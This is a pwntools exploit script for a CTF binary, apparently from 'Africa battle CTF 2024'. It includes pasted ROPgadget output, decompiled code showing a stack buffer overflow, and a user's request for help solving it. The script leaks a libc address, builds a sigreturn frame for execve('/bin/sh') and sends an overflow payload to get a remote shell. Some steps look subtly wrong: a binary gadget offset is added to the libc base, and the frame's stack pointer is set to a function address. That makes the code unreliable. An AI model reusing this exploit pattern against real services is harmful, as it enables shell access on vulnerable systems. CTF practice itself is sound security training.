#!/usr/bin/python3
from pwn import *
from sys import argv

e = context.binary = ELF('poj_patched')
libc = ELF('libc.so.6', checksec=False)
ld = ELF('ld-linux-x86-64.so.2', checksec=False)
if len(argv) > 1:
    ip, port = argv[1].split(":")
    conn = lambda: remote(ip, port)
else:
    conn = lambda: e.process()

p = conn()


"""

zwx@Audit-P6:/mnt/c/Users/zwx/Desktop/ctf/bugpwn/pwn $ ROPgadget --binary=./poj_patched
Gadgets information
============================================================
0x000000000000113b : add byte ptr [rax], 0 ; add byte ptr [rax], al ; endbr64 ; jmp 0x10c0
0x00000000000010b3 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret
0x000000000000113c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; jmp 0x10c0
0x0000000000001037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x1020
0x00000000000010b4 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x0000000000001130 : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret
0x000000000000113e : add byte ptr [rax], al ; endbr64 ; jmp 0x10c0
0x0000000000001039 : add byte ptr [rax], al ; jmp 0x1020
0x0000000000001034 : add byte ptr [rax], al ; push 0 ; jmp 0x1020
0x0000000000001044 : add byte ptr [rax], al ; push 1 ; jmp 0x1020
0x00000000000010b6 : add byte ptr [rax], al ; ret
0x0000000000001009 : add byte ptr [rax], al ; test rax, rax ; je 0x1012 ; call rax
0x00000000000010a8 : add byte ptr [rax], al ; test rax, rax ; je 0x10b8 ; jmp rax
0x00000000000010e9 : add byte ptr [rax], al ; test rax, rax ; je 0x10f8 ; jmp rax
0x00000000000010f5 : add byte ptr [rax], r8b ; ret
0x0000000000001131 : add byte ptr [rcx], al ; pop rbp ; ret
0x000000000000112f : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret
0x00000000000010e8 : add byte ptr cs:[rax], al ; test rax, rax ; je 0x10f8 ; jmp rax
0x0000000000001047 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x1020
0x0000000000001132 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax] ; ret
0x0000000000001013 : add esp, 8 ; ret
0x0000000000001012 : add rsp, 8 ; ret
0x0000000000001179 : call qword ptr [rax + 0x4855c3c9]
0x00000000000011c1 : call qword ptr [rax + 0xc35d]
0x0000000000001148 : call qword ptr [rbp + 0x48]
0x0000000000001010 : call rax
0x0000000000001143 : cli ; jmp 0x10c0
0x0000000000001140 : endbr64 ; jmp 0x10c0
0x000000000000114c : in eax, 0x58 ; ret
0x0000000000001155 : in eax, 0x5f ; jmp rax
0x00000000000010e7 : in eax, dx ; add byte ptr cs:[rax], al ; test rax, rax ; je 0x10f8 ; jmp rax
0x000000000000100e : je 0x1012 ; call rax
0x00000000000010ad : je 0x10b8 ; jmp rax
0x00000000000010ee : je 0x10f8 ; jmp rax
0x000000000000103b : jmp 0x1020
0x0000000000001144 : jmp 0x10c0
0x00000000000010af : jmp rax
0x000000000000117b : leave ; ret
0x0000000000001158 : loopne 0x10ea ; pop rbp ; ret
0x00000000000010f1 : loopne 0x1159 ; nop dword ptr [rax + rax] ; ret
0x000000000000112c : mov byte ptr [rip + 0x2eed], 1 ; pop rbp ; ret
0x000000000000114b : mov ebp, esp ; pop rax ; ret
0x0000000000001154 : mov ebp, esp ; pop rdi ; jmp rax
0x000000000000114a : mov rbp, rsp ; pop rax ; ret
0x0000000000001153 : mov rbp, rsp ; pop rdi ; jmp rax
0x000000000000117a : nop ; leave ; ret
0x000000000000114f : nop ; pop rbp ; ret
0x00000000000010f3 : nop dword ptr [rax + rax] ; ret
0x00000000000010b1 : nop dword ptr [rax] ; ret
0x00000000000010f2 : nop word ptr [rax + rax] ; ret
0x00000000000010ef : or bh, bh ; loopne 0x1159 ; nop dword ptr [rax + rax] ; ret
0x000000000000114d : pop rax ; ret
0x0000000000001133 : pop rbp ; ret
0x0000000000001156 : pop rdi ; jmp rax
0x0000000000001036 : push 0 ; jmp 0x1020
0x0000000000001046 : push 1 ; jmp 0x1020
0x0000000000001149 : push rbp ; mov rbp, rsp ; pop rax ; ret
0x0000000000001152 : push rbp ; mov rbp, rsp ; pop rdi ; jmp rax
0x0000000000001016 : ret
0x0000000000001042 : ret 0x2f
0x0000000000001111 : retf 0x2e
0x0000000000001022 : retf 0x2f
0x000000000000100d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x00000000000011c9 : sub esp, 8 ; add rsp, 8 ; ret
0x00000000000011c8 : sub rsp, 8 ; add rsp, 8 ; ret
0x000000000000100c : test eax, eax ; je 0x1012 ; call rax
0x00000000000010ab : test eax, eax ; je 0x10b8 ; jmp rax
0x00000000000010ec : test eax, eax ; je 0x10f8 ; jmp rax
0x000000000000100b : test rax, rax ; je 0x1012 ; call rax
0x00000000000010aa : test rax, rax ; je 0x10b8 ; jmp rax
0x00000000000010eb : test rax, rax ; je 0x10f8 ; jmp rax

Unique gadgets found: 71


__int64 __fastcall main(int a1, char **a2, char **a3)
{
  write(1, "Africa battle CTF 2024\n", 0x17uLL);
  printf("Write() address : %p\n", &write);
  return sub_115C();
}

ssize_t sub_115C()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  return read(0, buf, 0x100uLL);
}

 i have this pwn challenge how to solve this 

"""

p.recvuntil("Write() address : ")
write = int(p.recvline().strip(), 16)
log.info("write: " + hex(write))

libc.address = write - libc.sym.write
log.info("libc.address: " + hex(libc.address))

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = next(libc.search(b"/bin/sh\x00"))
frame.rsi = 0
frame.rdx = 0
frame.rip = libc.sym.execve
frame.rsp = libc.sym.execve
frame.rbp = libc.sym.execve

payload = b"A" * 72
payload += p64(libc.sym.read)
payload += p64(libc.sym.sigreturn)
payload += p64(libc.address + 0x00000000000010b3)
payload += bytes(frame)

p.sendline(payload)
p.sendline(b"/bin/sh\x00")






p.interactive()
